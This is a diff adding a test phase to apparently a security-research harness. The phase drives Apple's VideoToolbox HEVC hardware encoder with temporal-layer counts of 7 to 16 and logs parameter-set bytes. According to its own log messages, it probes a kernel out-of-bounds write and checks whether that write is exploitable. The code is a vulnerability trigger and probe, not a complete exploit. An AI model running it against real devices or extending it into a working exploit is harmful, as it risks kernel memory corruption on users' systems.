@@ -6723,6 +6723,80 @@ vps_cd_done:
             rlog("\nPhase 7 complete.\n");
         }
 
+        if (phase == 0 || phase == 8) {
+            rlog("\n--- Phase 8: TL=8+ detailed analysis (OOB boundary) ---\n");
+            rlog("Detailed VPS extraction at and beyond the kernel OOB boundary\n\n");
+
+            int test_tl8[] = {7, 8, 9, 10, 15, 16};
+            for (int t = 0; t < 6; t++) {
+                int val = test_tl8[t];
+                VTCompressionSessionRef s = NULL;
+                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(enc_spec,
+                    kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
+                    kCFBooleanTrue);
+                VTCompressionSessionCreate(NULL, w, h,
+                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
+                CFRelease(enc_spec);
+                if (!s) { rlog("TL=%d: CREATE FAIL\n", val); continue; }
+
+                CFNumberRef nlayers = CFNumberCreate(NULL, kCFNumberIntType, &val);
+                VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), nlayers);
+                CFRelease(nlayers);
+
+                VTCompressionSessionPrepareToEncodeFrames(s);
+                g_encode_done = 0; g_cb_status = -999;
+                if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
+                int es = encode_one(s, 0, w, h);
+
+                rlog("TL=%d: enc=%d cb=%d psets=%zu\n", val, es, (int)g_cb_status, g_last_pset_count);
+
+                if (g_saved_fmt) {
+                    size_t pset_count = 0;
+                    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                        g_saved_fmt, 0, NULL, NULL, &pset_count, NULL);
+                    rlog("  pset_count from fmt: %zu\n", pset_count);
+
+                    for (size_t pi = 0; pi < pset_count && pi < 10; pi++) {
+                        const uint8_t *p = NULL;
+                        size_t sz = 0;
+                        int nal_hdr_len = 0;
+                        OSStatus gst = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                            g_saved_fmt, pi, &p, &sz, NULL, &nal_hdr_len);
+                        rlog("  pset[%zu]: status=%d size=%zu nal_hdr=%d",
+                            pi, (int)gst, sz, nal_hdr_len);
+                        if (gst == noErr && p && sz > 0) {
+                            rlog(" bytes:");
+                            for (size_t b = 0; b < sz && b < 48; b++)
+                                rlog(" %02x", p[b]);
+                            if (sz > 48) rlog(" ... (%zu more)", sz - 48);
+                        }
+                        rlog("\n");
+                    }
+
+                    /* Also try to get CMSampleBuffer data size */
+                    rlog("  fmt extensions: ");
+                    CFDictionaryRef ext = CMFormatDescriptionGetExtensions(g_saved_fmt);
+                    if (ext) {
+                        rlog("%ld keys\n", (long)CFDictionaryGetCount(ext));
+                    } else {
+                        rlog("NULL\n");
+                    }
+                } else {
+                    rlog("  g_saved_fmt is NULL — callback may not have fired properly\n");
+                }
+
+                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+                rlog("\n");
+            }
+
+            rlog("Phase 8 complete.\n");
+            rlog("If TL=8+ produces different VPS sizes or corrupted bytes,\n");
+            rlog("the kernel OOB write is confirmed exploitable.\n");
+        }
+
         rlog("\n=== MCTF_OOB complete ===\n");
 
     } else if (strcmp(mode, "iosurface_probe") == 0) {
